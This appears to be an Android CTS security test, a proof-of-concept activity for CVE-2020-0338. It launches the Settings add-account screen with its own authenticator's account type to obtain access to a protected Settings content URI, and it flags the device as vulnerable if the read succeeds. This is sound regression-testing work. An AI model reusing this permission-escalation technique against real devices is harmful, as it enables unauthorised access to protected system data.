/*
 * Copyright (C) 2022 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2020_0338;

import android.app.Activity;
import android.content.Intent;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;

import java.io.FileNotFoundException;

public class PocActivity extends Activity {

    private Context mContext;

    private void setResult(int result, String message) {
        SharedPreferences sh =
                getSharedPreferences(getString(R.string.SHARED_PREFERENCE), Context.MODE_PRIVATE);
        SharedPreferences.Editor edit = sh.edit();
        edit.putInt(getString(R.string.RESULT_KEY), result);
        edit.putString(getString(R.string.MESSAGE_KEY), message);
        edit.commit();
        Intent intent = new Intent(PocActivity.this, PocService.class);
        stopService(intent);
        finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mContext = this.getApplicationContext();
        readFileDescriptor();
        grantSettingsPermissions();
        readFileDescriptor();
    }

    private void readFileDescriptor() {
        final Uri uri = getUri();
        try {
            this.getContentResolver().openFileDescriptor(uri, "r");
        } catch (FileNotFoundException e) {
            setResult(getResources().getInteger(R.integer.ASSUMPTION_FAILURE), e.toString());
        } catch (SecurityException e) {
            // This is expected so do nothing and return
            return;
        }
        setResult(getResources().getInteger(R.integer.FAIL), "Vulnerable to b/123700107!!");
    }

    public Uri getUri() {
        return Uri.parse(PocAuthenticator.getSettingsUris().get(0).toString());
    }

    private static boolean isCar(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_AUTOMOTIVE);
    }

    public void grantSettingsPermissions() {
        try {
            String pkg = isCar(mContext) ? "com.android.car.settings" : "com.android.settings";
            String cls = isCar(mContext) ? "com.android.car.settings.accounts.AddAccountActivity"
                    : "com.android.settings.accounts.AddAccountSettings";
            String accountTypes[] = {PocAuthenticator.ACCOUNT_TYPE};
            Intent intent = new Intent();
            intent.setClassName(pkg, cls);
            intent.putExtra("account_types", accountTypes);
            startActivity(intent);
            Thread.sleep(6000);
        } catch (Exception e) {
            setResult(getResources().getInteger(R.integer.ASSUMPTION_FAILURE), e.toString());
        }
    }
}
